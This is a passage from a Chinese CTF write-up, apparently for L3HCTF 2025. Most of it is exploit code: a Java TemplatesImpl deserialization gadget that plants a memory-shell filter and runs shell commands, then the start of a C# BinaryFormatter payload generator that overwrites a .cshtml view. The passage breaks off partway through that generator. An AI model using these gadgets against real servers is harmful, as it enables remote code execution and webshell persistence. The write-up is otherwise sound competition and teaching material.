</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>tplClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>.</span><span class=na>class</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>abstTranslet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=p>.</span><span class=na>class</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>transFactory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TransformerFactoryImpl</span><span class=p>.</span><span class=na>class</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;memo.FilterMemshell&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>false</span><span class=p>,</span><span class=w> </span><span class=n>Thread</span><span class=p>.</span><span class=na>currentThread</span><span class=p>().</span><span class=na>getContextClassLoader</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>createTemplatesImpl</span><span class=p>(</span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>String</span><span class=p>)</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=p>)</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>tplClass</span><span class=p>,</span><span class=w> </span><span class=n>abstTranslet</span><span class=p>,</span><span class=w> </span><span class=n>transFactory</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>T</span><span class=w> </span><span class=nf>createTemplatesImpl</span><span class=p>(</span><span class=n>Class</span><span class=w> </span><span class=n>myClass</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>command</span><span class=p>,</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>tplClass</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>abstTranslet</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>transFactory</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>T</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>T</span><span class=p>)</span><span class=w> </span><span class=n>tplClass</span><span class=p>.</span><span class=na>newInstance</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>classBytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>pool</span><span class=p>.</span><span class=na>insertClassPath</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>LoaderClassPath</span><span class=p>(</span><span class=n>Thread</span><span class=p>.</span><span class=na>currentThread</span><span class=p>().</span><span class=na>getContextClassLoader</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>superC</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>abstTranslet</span><span class=p>.</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>myClass</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>CtClass</span><span class=w> </span><span class=n>ctClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>myClass</span><span class=p>.</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ctClass</span><span class=p>.</span><span class=na>setSuperclass</span><span class=p>(</span><span class=n>superC</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ctClass</span><span class=p>.</span><span class=na>setName</span><span class=p>(</span><span class=n>myClass</span><span class=p>.</span><span class=na>getName</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>nanoTime</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>classBytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctClass</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_bytecodes&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>classBytes</span><span class=p>,</span><span class=w> </span><span class=n>ClassFiles</span><span class=p>.</span><span class=na>classAsBytes</span><span class=p>(</span><span class=n>Foo</span><span class=p>.</span><span class=na>class</span><span class=p>)});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;ysoserial.Pwner&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>nanoTime</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_tfactory&#34;</span><span class=p>,</span><span class=w> </span><span class=n>transFactory</span><span class=p>.</span><span class=na>newInstance</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>templates</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>T</span><span class=w> </span><span class=nf>createTemplatesImpl</span><span class=p>(</span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>command</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>tplClass</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>abstTranslet</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>transFactory</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=n>T</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tplClass</span><span class=p>.</span><span class=na>newInstance</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// use template gadget class</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>pool</span><span class=p>.</span><span class=na>insertClassPath</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ClassClassPath</span><span class=p>(</span><span class=n>StubTransletPayload</span><span class=p>.</span><span class=na>class</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>pool</span><span class=p>.</span><span class=na>insertClassPath</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ClassClassPath</span><span class=p>(</span><span class=n>abstTranslet</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=n>CtClass</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>StubTransletPayload</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// run command in static initializer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>command</span><span class=p>.</span><span class=na>replace</span><span class=p>(</span><span class=s>&#34;\\&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;\\\\&#34;</span><span class=p>).</span><span class=na>replace</span><span class=p>(</span><span class=s>&#34;\&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;\\\&#34;&#34;</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;\&#34;);&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>clazz</span><span class=p>.</span><span class=na>makeClassInitializer</span><span class=p>().</span><span class=na>insertAfter</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>clazz</span><span class=p>.</span><span class=na>setName</span><span class=p>(</span><span class=s>&#34;ysoserial.Pwner&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>nanoTime</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>superC</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>abstTranslet</span><span class=p>.</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>clazz</span><span class=p>.</span><span class=na>setSuperclass</span><span class=p>(</span><span class=n>superC</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>classBytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// inject class bytes into instance</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_bytecodes&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>classBytes</span><span class=p>,</span><span class=w> </span><span class=n>ClassFiles</span><span class=p>.</span><span class=na>classAsBytes</span><span class=p>(</span><span class=n>Foo</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// required to make TemplatesImpl happy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Pwnr&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Reflections</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_tfactory&#34;</span><span class=p>,</span><span class=w> </span><span class=n>transFactory</span><span class=p>.</span><span class=na>newInstance</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>templates</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>class</span> <span class=nc>Foo</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>Serializable</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>serialVersionUID</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>8207363842866235160L</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>class</span> <span class=nc>StubTransletPayload</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>Serializable</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>serialVersionUID</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>-</span><span class=n>5971610431559700674L</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>DOM</span><span class=w> </span><span class=n>document</span><span class=p>,</span><span class=w> </span><span class=n>SerializationHandler</span><span class=o>[]</span><span class=w> </span><span class=n>handlers</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransletException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>DOM</span><span class=w> </span><span class=n>document</span><span class=p>,</span><span class=w> </span><span class=n>DTMAxisIterator</span><span class=w> </span><span class=n>iterator</span><span class=p>,</span><span class=w> </span><span class=n>SerializationHandler</span><span class=w> </span><span class=n>handler</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransletException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>到最后仍旧有个小坑点，这台机器远程没有/bin/bash，捣鼓半天换成/bin/sh就拿到flag了</p><p><img src=https://su-team.cn/img/2025-L3HCTF/628e4417-4507-45a2-ba52-5ecf38f1a415.png alt=img></p><p>Get flag</p><p><img src=https://su-team.cn/img/2025-L3HCTF/db43b021-3df5-48ca-ab97-3edb5efa1554.png alt=img></p><h2 id=lookingmyeyes>LookingMyEyes</h2><p>考察.NET反序列化，看一下链子的构成</p><p>出题人写了一条非常简单的链子。</p><p><img src=https://su-team.cn/img/2025-L3HCTF/b12e1317-4812-4bdc-a518-fe2dbb461620.png alt=img></p><p>这里直接利用委托方法调用写文件的函数。覆盖/app/Looking/My/Eyes.cshtml</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>using</span><span class=w> </span><span class=n>ClassLibrary1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>using</span><span class=w> </span><span class=n>ClassLibrary1</span><span class=p>.</span><span class=na>Beans</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>using</span><span class=w> </span><span class=n>ClassLibrary1</span><span class=p>.</span><span class=na>Transform</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>using</span><span class=w> </span><span class=n>ClassLibrary1</span><span class=p>.</span><span class=na>Utils</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>using</span><span class=w> </span><span class=n>System</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>using</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>IO</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>using</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>Reflection</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>using</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>Runtime</span><span class=p>.</span><span class=na>Serialization</span><span class=p>.</span><span class=na>Formatters</span><span class=p>.</span><span class=na>Binary</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>AdvancedTestPayloadGenerator</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>Main</span><span class=p>(</span><span class=n>string</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>string</span><span class=w> </span><span class=n>base64</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Generate</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Console</span><span class=p>.</span><span class=na>WriteLine</span><span class=p>(</span><span class=s>&#34;=== Generated BinaryFormatter Payload (Base64) ===&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Console</span><span class=p>.</span><span class=na>WriteLine</span><span class=p>(</span><span class=n>base64</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Console</span><span class=p>.</span><span class=na>WriteLine</span><span class=p>(</span><span class=s>&#34;=== End ===&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>object</span><span class=w> </span><span class=nf>Deserialize</span><span class=p>(</span><span class=n>string</span><span class=w> </span><span class=n>s</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AppContext</span><span class=p>.</span><span class=na>SetSwitch</span><span class=p>(</span><span class=s>&#34;Switch.System.Runtime.Serialization.SerializationGuard.AllowFileWrites&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>object</span><span class=w> </span><span class=n>obj</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>using</span><span class=w> </span><span class=p>(</span><span class=n>MemoryStream</span><span class=w> </span><span class=n>memoryStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>MemoryStream</span><span class=p>(</span><span class=n>Convert</span><span class=p>.</span><span class=na>FromBase64String</span><span class=p>(</span><span class=n>s</span><span class=p>)))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>object</span><span class=w> </span><span class=n>deserialize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BinaryFormatter</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Binder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>MySecBinder</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}.</span><span class=na>Deserialize</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>obj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>deserialize</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>obj</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>string</span><span class=w> </span><span class=nf>Generate</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
